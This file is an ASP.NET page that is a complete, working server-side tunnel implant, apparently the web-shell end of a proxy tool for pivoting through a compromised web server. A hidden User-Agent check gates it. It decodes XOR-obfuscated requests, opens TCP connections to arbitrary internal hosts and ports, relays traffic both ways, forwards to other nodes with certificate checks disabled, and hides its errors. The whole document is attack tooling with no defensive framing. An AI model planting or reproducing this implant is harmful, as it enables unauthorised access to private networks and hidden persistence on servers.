<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Collections.Generic" %><script runat="server">
    static Hashtable addrs = CollectAddr();
    static Hashtable ctx = Hashtable.Synchronized(new Hashtable());

    private bool checkAuth()
    {
        string ua = Request.Headers.Get("User-Agent");
        if (ua == null || !ua.Equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3"))
        {
            return false;
        }
        if (Request.ContentType.Equals("application/plain"))
        {
            byte[] readData = Request.BinaryRead(32);
            Response.BinaryWrite(readData);
            Response.Flush();
            return false;
        }
        return true;
    }
    protected void processUnary()
    {
        Response.ContentType = "application/octet-stream";
        byte[] body = Request.BinaryRead(Request.ContentLength);
        Dictionary<string, byte[]> dataMap = Unmarshal(body);
        string clientId = Encoding.ASCII.GetString(dataMap["id"]);
        byte[] actions = dataMap["ac"];
        if (actions.Length != 1) return;
        byte action = actions[0];

        byte[] redirectData = null;
        bool needRedirect = dataMap.TryGetValue("r", out redirectData) && redirectData != null && redirectData.Length > 0;
        string redirectUrl = "";
        if (needRedirect)
        {
            dataMap.Remove("r");
            redirectUrl = Encoding.ASCII.GetString(redirectData);
            Uri u = new Uri(redirectUrl);
            needRedirect = !addrs.ContainsKey(u.Host);
        }

        // load balance, send request with data to request url
        // action 0x00 need to pipe stream, see below
        if (needRedirect && action >= 0x01 && action <= 0x03)
        {
            HttpWebResponse resp = Redirect(Request, dataMap, redirectUrl);
            resp.Close();
            return;
        }

        /*
            ActionCreate    byte = 0x00
            ActionData      byte = 0x01
            ActionDelete    byte = 0x02
            ActionHeartbeat byte = 0x03
        */
        Stream respOutStream = Response.OutputStream;
        if (action == 0x02)
        {
            if (!ctx.ContainsKey(clientId)) return;
            TcpClient s = (TcpClient)ctx[clientId];
            ctx.Remove(clientId);
            if (s == null) return;
            s.Close();
            return;
        }
        else if (action == 0x01)
        {
            // todo: remove unneeded package
            if (!ctx.ContainsKey(clientId))
            {
                byte[] data = Marshal(newDel());
                respOutStream.Write(data, 0, data.Length);
                return;
            };
            TcpClient s = (TcpClient)ctx[clientId];
            byte[] scData = dataMap["dt"];
            if (scData.Length != 0)
            {
                s.GetStream().Write(scData, 0, scData.Length);
            }
            return;
        }
        else { }

        if (action != 0x00) return;
        Response.AddHeader("X-Accel-Buffering", "no");
        string host = Encoding.ASCII.GetString(dataMap["h"]);
        IPAddress ip;
        try
        {
            ip = IPAddress.Parse(host);
        }
        catch (Exception)
        {
            IPHostEntry hostInfo = Dns.GetHostEntry(host);
            if (hostInfo.AddressList.Length == 0)
            {
                byte[] data = Marshal(newStatus(0x01));
                respOutStream.Write(data, 0, data.Length);
                return;
            }
            ip = hostInfo.AddressList[0];
        }
        string portStr = Encoding.ASCII.GetString(dataMap["p"]).Trim();
        if (portStr == "0")
        {
            portStr = Request.ServerVariables["SERVER_PORT"];
            if (portStr == "")
            {
                portStr = "80";
            }
        }
        int port = Int32.Parse(portStr);

        TcpClient client = null;
        Stream readFrom = null;
        if (needRedirect)
        {
            HttpWebResponse resp = Redirect(Request, dataMap, redirectUrl);
            readFrom = resp.GetResponseStream();
        }
        else
        {

            try
            {
                client = new TcpClient();
                bool isOk = client.BeginConnect(ip, port, null, null).AsyncWaitHandle.WaitOne(3000, true);
                if (isOk)
                {
                    ctx.Add(clientId, client);
                    readFrom = client.GetStream();
                    byte[] data = Marshal(newStatus(0x00));
                    respOutStream.Write(data, 0, data.Length);
                    respOutStream.Flush();
                    Response.Flush();
                }
                else
                {
                    throw new IOException("");
                }
            }
            catch (Exception)
            {
                if (client != null)
                {
                    client.Close();
                }
                ctx.Remove(clientId);
                byte[] data = Marshal(newStatus(0x01));
                respOutStream.Write(data, 0, data.Length);
                return;
            }
        }

        byte[] readBuf = new byte[1024 * 8];
        try
        {
            while (true)
            {
                int readLen = readFrom.Read(readBuf, 0, readBuf.Length);
                if (readLen == 0) break;
                byte[] realBuf = new byte[readLen];
                Array.Copy(readBuf, realBuf, readLen);
                if (!needRedirect)
                {
                    realBuf = Marshal(newData(realBuf));
                }
                respOutStream.Write(realBuf, 0, realBuf.Length);
                respOutStream.Flush();
                Response.Flush();
            }
        }
        catch (Exception)
        {
        }
        finally
        {
            if (readFrom != null) readFrom.Close();
            if (client != null) client.Close();
            ctx.Remove(clientId);
        }
    }

    private static byte[] Marshal(Dictionary<String, byte[]> m)
    {
        MemoryStream buf = new MemoryStream();
        BinaryWriter bw = new BinaryWriter(buf);
        foreach (KeyValuePair<string, byte[]> kvp in m)
        {
            string key = kvp.Key;
            byte[] value = kvp.Value;
            bw.Write((Byte)key.Length);
            bw.Write((Encoding.ASCII.GetBytes(key)));
            byte[] vLen = BitConverter.GetBytes((Int32)value.Length);
            Array.Reverse(vLen);
            bw.Write(vLen);
            bw.Write(value);
        }
        bw.Close();
        byte[] data = buf.ToArray();
        byte[] randKeys = new byte[1];
        new Random().NextBytes(randKeys);
        byte xorKey = randKeys[0];

        buf = new MemoryStream();
        bw = new BinaryWriter(buf);
        byte[] lenData = BitConverter.GetBytes((Int32)data.Length);
        Array.Reverse(lenData);
        bw.Write(lenData);
        bw.Write(xorKey);

        for (int i = 0; i < data.Length; i++)
        {
            data[i] = (byte)(data[i] ^ xorKey);
        }
        bw.Write(data);
        bw.Close();
        return buf.ToArray();
    }

    private static Dictionary<string, byte[]> Unmarshal(byte[] body)
    {
        BinaryReader br = new BinaryReader(new MemoryStream(body));
        // bigendian
        byte[] lenData = br.ReadBytes(4);
        Array.Reverse(lenData);
        int len = BitConverter.ToInt32(lenData, 0);

        byte xor = br.ReadByte();
        if (len > 1024 * 1024 * 32)
        {
            throw new IOException("invalid len");
        }
        byte[] data = br.ReadBytes(len);
        if (data.Length != len)
        {
            throw new IOException("invalid data");
        }
        for (int i = 0; i < data.Length; i++)
        {
            data[i] = (byte)(data[i] ^ xor);
        }
        br.Close();
        br = new BinaryReader(new MemoryStream(data));
        Dictionary<String, byte[]> m = new Dictionary<string, byte[]>();
        for (int i = 0; i < data.Length - 1;)
        {
            int kLen = (int)br.ReadByte();
            i += 1;
            if (kLen < 0 || i + kLen >= data.Length)
            {
                break;
            }
            string key = Encoding.ASCII.GetString(br.ReadBytes(kLen));
            i += kLen;

            if (i + 4 >= data.Length)
            {
                break;
            }
            byte[] vlenData = br.ReadBytes(4);
            i += 4;
            Array.Reverse(vlenData);
            int vLen = BitConverter.ToInt32(vlenData, 0);
            if (vLen < 0 || i + vLen > data.Length)
            {
                break;
            }
            byte[] value = br.ReadBytes(vLen);
            i += vLen;
            m.Add(key, value);
        }
        br.Close();
        return m;
    }

    private static Dictionary<string, byte[]> newDel()
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m.Add("ac", new byte[] { 0x02 });
        return m;
    }

    private static Dictionary<string, byte[]> newStatus(byte b)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m.Add("s", new byte[] { b });
        return m;
    }

    private static Dictionary<string, byte[]> newData(byte[] data)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m.Add("ac", new byte[] { 0x01 });
        m.Add("dt", data);
        return m;
    }

    private static Hashtable CollectAddr()
    {
        Hashtable addrs = new Hashtable();

        try
        {
            NetworkInterface[] nifs = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nif in nifs)
            {
                IPInterfaceProperties ipProps = nif.GetIPProperties();
                foreach (IPAddressInformation addrInfo in ipProps.UnicastAddresses)
                {
                    string s = addrInfo.Address.ToString();
                    if (s != null)
                    {
                        int idx = s.IndexOf('%');
                        if (idx > 0)
                        {
                            s = s.Substring(0, idx);
                        }
                        addrs[s] = true;
                    }
                }
            }
        }
        catch (Exception)
        {
        }

        return Hashtable.Synchronized(addrs);
    }

    private static HttpWebResponse Redirect(HttpRequest request, Dictionary<string, byte[]> dataMap, string rUrl)
    {
        string method = request.HttpMethod;
        HttpWebRequest conn = (HttpWebRequest)WebRequest.Create(rUrl);
        conn.Method = method;
        conn.Timeout = 3000;
        conn.ReadWriteTimeout = System.Threading.Timeout.Infinite;
        conn.AllowAutoRedirect = true;

        // Ignore SSL verify
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

        DateTime date;
        foreach (string key in request.Headers.AllKeys)
        {
            string value = request.Headers[key];
            // avoid System.ArgumentException
            switch (key)
            {
                case "Accept":
                    conn.Accept = value;
                    break;
                case "Connection":
                    conn.Connection = value;
                    break;
                case "Content-Type":
                    conn.ContentType = value;
                    break;
                case "Content-Length":
                    break;
                // .net 2.0 doesn't has this attr
                //case "Date":
                //if (DateTime.TryParse(value, out date)) conn.Date = date;
                //break;
                case "Expect":
                    conn.Expect = value;
                    break;
                case "If-Modified-Since":
                    if (DateTime.TryParse(value, out date)) conn.IfModifiedSince = date;
                    break;
                case "Referer":
                    conn.Referer = value;
                    break;
                case "User-Agent":
                    conn.UserAgent = value;
                    break;
                default:
                    if (WebHeaderCollection.IsRestricted(key, false))
                    {
                        continue;
                    }
                    conn.Headers.Add(key, request.Headers[key]);
                    break;
            }
        }
        Stream rout = conn.GetRequestStream();
        byte[] data = Marshal(dataMap);
        rout.Write(data, 0, data.Length);
        rout.Close();

        HttpWebResponse response = (HttpWebResponse)conn.GetResponse();
        return response;
    }</script><%
    if (!ctx.ContainsKey("alter_pool"))
    {
        ctx.Add("alter_pool", new TcpClient());
        const int workers = 256;
        int workerThreads, completionPortThreads;
        System.Threading.ThreadPool.GetMaxThreads(out workerThreads, out completionPortThreads);
        if (workerThreads < workers) workerThreads += workers;
        if (completionPortThreads < workers) completionPortThreads += workers;
        System.Threading.ThreadPool.SetMaxThreads(workerThreads, completionPortThreads);

        System.Threading.ThreadPool.GetMinThreads(out workerThreads, out completionPortThreads);
        if (workerThreads < workers) workerThreads = workers;
        if (completionPortThreads < workers) completionPortThreads = workers;
        System.Threading.ThreadPool.SetMinThreads(workerThreads, completionPortThreads);
    }

    Context.Server.ScriptTimeout = Int32.MaxValue;
    bool pass = checkAuth();
    if (!pass)
    {
        return;
    }
    try
    {
        processUnary();
    }
    catch (Exception ex)
    {
    }
%>